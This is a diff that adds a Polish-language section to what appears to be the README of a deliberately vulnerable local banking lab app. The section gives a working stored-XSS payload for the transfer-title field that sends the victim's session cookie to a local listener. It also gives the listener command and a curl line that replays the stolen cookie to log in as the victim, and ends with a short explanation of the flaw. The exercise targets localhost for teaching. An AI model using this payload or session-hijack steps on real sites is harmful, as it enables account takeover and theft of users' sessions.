@@ -42,6 +42,36 @@ zalogowanym użytkownikiem, bez hasła i bez 2FA.*
 
 ---
 
+## Payload XSS (do wypróbowania)
+
+Podatność to **stored XSS w tytule przelewu** — serwer renderuje tytuł bez escapowania.
+Zaloguj się jako `mallory`, wyślij Alicji przelew na `0,01`, a w polu **Tytuł przelewu** wklej:
+
+```html
+<script>new Image().src="http://localhost:9000/?c="+encodeURIComponent(document.cookie)</script>
+```
+
+Na osobnym terminalu odpal nasłuch atakującego:
+
+```powershell
+python -m http.server 9000
+```
+
+Gdy Alicja otworzy historię transakcji, jej przeglądarka wykona skrypt i wyśle `SESSIONID`
+na ten serwer. Skradzione cookie wklejasz u siebie — **DevTools → Application → Cookies**
+albo:
+
+```powershell
+curl http://localhost:5476/dashboard -H "Cookie: SESSIONID=<skradziony_id>"
+```
+
+…i jesteś zalogowany jako Alicja, bez hasła.
+
+> Dlaczego działa: tytuł przelewu trafia do HTML surowo, a cookie nie ma flagi `HttpOnly`,
+> więc `document.cookie` (JavaScript) może je odczytać i wysłać na zewnątrz.
+
+---
+
 ## Tryby uruchomienia
 
 | Polecenie | Co uruchamia |
